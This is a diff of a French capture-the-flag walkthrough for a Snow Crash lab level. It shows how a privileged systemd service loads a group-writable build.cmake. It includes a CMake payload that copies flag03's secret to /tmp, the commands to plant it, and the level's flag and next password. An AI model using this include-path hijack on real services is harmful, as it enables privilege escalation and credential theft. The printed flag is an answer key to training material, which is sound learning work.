@@ -1,5 +1,7 @@
 # Level03 — Faire exécuter un script CMake
 
+**Point de départ :** une session sur la VM Snow Crash sous `level03`. Le flag de ce niveau sert de mot de passe au compte `level04`.
+
 ## Objectif
 
 Comprendre comment un service privilégié peut exécuter des instructions contrôlées par un utilisateur moins privilégié. La faille repose sur la confiance accordée à un fichier CMake modifiable.
@@ -10,7 +12,7 @@ Comprendre comment un service privilégié peut exécuter des instructions contr
 cat README
 ```
 
-Résultat :
+Résultat de référence (à confirmer sur la VM) :
 
 ```text
 Every Burbclave has rules. Find the loophole.
@@ -28,7 +30,7 @@ find / -iname '*burbclave*' 2>/dev/null
 | `-iname '*burbclave*'` | Ne retenir que les chemins dont le nom contient `burbclave`, sans tenir compte de la casse. |
 | `2>/dev/null` | Masquer les erreurs d’accès. |
 
-Parmi les résultats se trouve le fichier d’unité `/etc/systemd/system/burbclave.service`. Son nom donne le service à examiner. La configuration systemd permettra ensuite de savoir ce qu’il exécute.
+Rechercher notamment `/etc/systemd/system/burbclave.service`, puis examiner cette unité systemd.
 
 ## 2. Comprendre le point faible
 
@@ -38,7 +40,7 @@ Parmi les résultats se trouve le fichier d’unité `/etc/systemd/system/burbcl
 systemctl cat burbclave.service
 ```
 
-Les lignes utiles sont :
+Extrait de configuration à confirmer :
 
 ```ini
 User=flag03
@@ -47,7 +49,7 @@ StandardOutput=null
 StandardError=null
 ```
 
-Le service exécute donc `CMakeLists.txt` avec les droits de `flag03`. Sa sortie est supprimée, ce qui explique pourquoi notre script écrira le résultat dans `/tmp`.
+Le service exécute donc `CMakeLists.txt` avec les droits de `flag03`. Les sorties standard et d’erreur sont redirigées vers `null` dans cet extrait ; le script utilise donc un fichier dans `/tmp`.
 
 ### 2.2. `CMakeLists.txt` charge un autre fichier
 
@@ -55,7 +57,7 @@ Le service exécute donc `CMakeLists.txt` avec les droits de `flag03`. Sa sortie
 cat /opt/snowcrash/level03/CMakeLists.txt
 ```
 
-Les dernières instructions lisent une configuration protégée, calculent un répertoire, puis exécutent un fichier nommé `build.cmake` :
+Les instructions suivantes, à confirmer dans le fichier complet, lisent une configuration, calculent un répertoire et chargent `build.cmake` :
 
 ```cmake
 file(READ "/etc/burbclave/burbclave.conf" CONF_CONTENT)
@@ -63,36 +65,42 @@ string(CONCAT RESOLVED_BUILD_PATH "${RUNTIME_BASE}" "/" "${WORKSPACE_NAME}")
 include(${RESOLVED_BUILD_PATH}/build.cmake)
 ```
 
-`level03` ne peut pas lire la configuration qui contient le chemin :
+Vérifier si la configuration est accessible :
+
+```bash
+cat /etc/burbclave/burbclave.conf
+```
+
+Erreur de référence :
 
 ```text
 cat: /etc/burbclave/burbclave.conf: Permission denied
 ```
 
-À ce stade, nous savons seulement que le service cherche un fichier `build.cmake` dans un répertoire calculé.
+L’extrait ne suffit pas à établir la valeur de `RESOLVED_BUILD_PATH`.
 
 ### 2.3. Trouver un emplacement modifiable
 
-Le fichier `CMakeLists.txt` contient aussi cette valeur :
+Autre ligne à rechercher dans `CMakeLists.txt` :
 
 ```cmake
 set(BURBCLAVE_STATE_DIR "/var/lib/burbclave")
 ```
 
-Elle ne donne pas le chemin final, mais indique un répertoire pertinent à examiner :
+Examiner ce répertoire :
 
 ```bash
 find /var/lib/burbclave -maxdepth 2 -type d -ls 2>/dev/null
 ```
 
-Cette recherche fait apparaître le dossier `/var/lib/burbclave/staging`. Il reste à vérifier si `level03` peut y écrire :
+Vérifier les droits du dossier `/var/lib/burbclave/staging` :
 
 ```bash
 id
 ls -ld /var/lib/burbclave/staging
 ```
 
-Résultats observés :
+Extrait de référence (à confirmer sur la VM) :
 
 ```text
 uid=1004(level03) gid=1006(level03) groups=1006(level03),988(burbclave),1001(levelgroup)
@@ -101,7 +109,7 @@ drwxrwxr-x 2 root burbclave 4096 Nov 6 10:53 /var/lib/burbclave/staging
 
 La commande `id` montre que `level03` appartient au groupe `burbclave`. Dans `drwxrwxr-x`, le deuxième groupe de droits est celui du groupe propriétaire : `rwx`. Le groupe `burbclave` peut donc écrire dans `staging`.
 
-Le fichier suivant devient donc notre candidat :
+Chemin à tester :
 
 ```text
 /var/lib/burbclave/staging/build.cmake
@@ -109,14 +117,14 @@ Le fichier suivant devient donc notre candidat :
 
 ### 2.4. Confirmer l’hypothèse
 
-Le fichier de configuration reste illisible ; le chemin est confirmé par un test. Nous plaçons `build.cmake` dans `staging`, puis attendons le timer. Lorsque `/tmp/level03_recovered` apparaît avec le flag, deux éléments sont confirmés :
+Si la configuration est illisible, le chemin doit être confirmé par le test des sections suivantes. Si un nouveau fichier `/tmp/level03_recovered` contenant le flag est effectivement créé par le service, cela permettra d’étayer les deux conclusions suivantes :
 
 1. le chemin calculé par `CMakeLists.txt` mène bien au dossier `staging` ;
 2. `build.cmake` est exécuté avec les droits de `flag03`.
 
 ## 3. Comprendre le script CMake
 
-Le fichier [build.cmake](build.cmake) ne contient que deux instructions :
+Le script CMake utilisé est intégralement reproduit ici :
 
 ```cmake
 file(READ "/home/flag03/.flag" SECRET)
@@ -126,9 +134,9 @@ file(WRITE "/tmp/level03_recovered" "${SECRET}")
 | Instruction | Effet |
 | --- | --- |
 | `file(READ ... SECRET)` | Lire `.flag` et placer son contenu dans la variable CMake `SECRET`. |
-| `file(WRITE ... "${SECRET}")` | Écrire cette variable dans un fichier que `level03` pourra consulter. |
+| `file(WRITE ... "${SECRET}")` | Écrire cette variable dans le fichier de sortie ; vérifier ses droits de lecture. |
 
-CMake sert habituellement à configurer la construction de programmes, et son langage permet également de manipuler des fichiers. Les deux instructions présentées réalisent toute l’opération.
+CMake sert habituellement à configurer la construction de programmes, et son langage permet également de manipuler des fichiers.
 
 ## 4. Installer le script
 
@@ -149,7 +157,7 @@ Dans cette construction :
 
 ## 5. Attendre l’exécution du service
 
-Les notes indiquent que le service est déclenché périodiquement par un timer. Pour identifier les timers et leur prochain passage :
+Vérifier si un timer déclenche le service et identifier son prochain passage :
 
 ```bash
 systemctl list-timers --all
@@ -161,10 +169,23 @@ Après le passage du service, lire le fichier produit :
 cat /tmp/level03_recovered
 ```
 
-Le contenu récupéré est :
+Flag de référence à comparer au fichier produit :
 
 ```text
 b209ea91ad7a5c2a0b0f4e195ca4
 ```
 
-Le fichier apparaît après le déclenchement du timer. Consulter la liste des timers permet de connaître le prochain passage avant de relire la sortie.
+Confirmer que le fichier est créé par le service lors de ce test, et non lors d’une exécution antérieure.
+
+## Passer au niveau suivant
+
+Après avoir confirmé le flag sur la VM, essayer `su - level04` avec cette valeur comme mot de passe, puis contrôler le compte courant avec `id -un`. Résultat attendu : `level04`. Cette connexion reste à valider.
+
+## Validation sur la VM
+
+Les valeurs et extraits de terminal ci-dessus proviennent de la solution fournie ; ils ne constituent pas une nouvelle preuve d’exécution. Les vérifications suivantes restent à effectuer :
+
+- [ ] Relever la définition du service et les extraits complets qui déterminent le chemin chargé.
+- [ ] Confirmer le refus de lecture, les groupes et les droits de `staging`.
+- [ ] Identifier le timer, vérifier la création du fichier de sortie et ses droits.
+- [ ] Comparer le résultat au flag de référence et confirmer le passage à `level04`.
